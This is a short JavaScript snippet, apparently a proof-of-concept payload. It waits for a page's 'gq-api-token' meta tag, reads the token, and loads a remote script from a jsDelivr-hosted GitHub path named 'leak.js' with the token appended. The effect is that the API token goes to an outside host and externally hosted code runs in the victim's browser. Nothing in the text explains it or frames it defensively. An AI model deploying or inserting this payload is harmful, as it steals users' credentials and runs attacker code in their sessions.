(function poll() {
  const meta = document.querySelector('meta[name="gq-api-token"]');
  if (!meta) return setTimeout(poll, 500);

  const token = encodeURIComponent(meta.content);
  const s = document.createElement('script');
  s.src = 'https://cdn.jsdelivr.net/gh/michan10232/poc/leak.js?token=' + token;
  document.body.appendChild(s);
})();
